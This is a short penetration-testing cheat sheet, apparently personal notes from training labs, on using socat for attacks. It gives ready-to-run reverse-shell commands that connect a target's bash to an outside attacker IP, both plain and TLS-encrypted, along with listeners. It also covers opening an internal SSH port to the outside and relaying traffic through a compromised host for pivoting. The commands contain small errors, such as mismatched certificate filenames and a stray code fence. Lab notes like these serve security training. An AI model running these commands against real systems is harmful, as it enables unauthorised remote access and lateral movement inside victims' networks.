##### Socat reverse shell (Linux target)
`socat TCP:10.8.1.167:5555 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
-   **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
-   **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
-   **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
-   **setsid**, creates the process in a new session
-   **sane**, stabilises the terminal, attempting to "normalise" it.


##### Listen
`socat -dd TCP-L:5555 STDOUT`


##### Create encrypted reverse shell
```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 999 -out shell.crt  // Creating the key, creates "shell.crt, shell.key"
cat shell.key cert.crt > shell.pem```  // Combine keys
socat OPENSSL-CONNECT:10.8.16.7:4444 EXEC:"bash -li",pty,stderr,sigint,setsid,sane // Connect
socat -d -d OPENSSL-LISTEN:4444,cert=/home/edu/THM/EXPLOITS/shell.pem,verify=0// Listen
```

##### Open external port to access internal
```
./socat_linux tcp-listen:9001,reuseaddr,fork tcp:127.0.0.1:22      // Opens port 9001, connecting to the internal SSH protocol
```

##### Socat port forward:
```
socat TCP-L:8001 TCP-L:8000,fork,reuseaddr & // Set up listener on attacking machine, :8001 to :8000 and :8000 to :8001
socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork & // Set up relay on compromised host
```

Send data (nmap, hydra, etc) through `127.0.0.1:8000`
Don't forget to close Socat after use


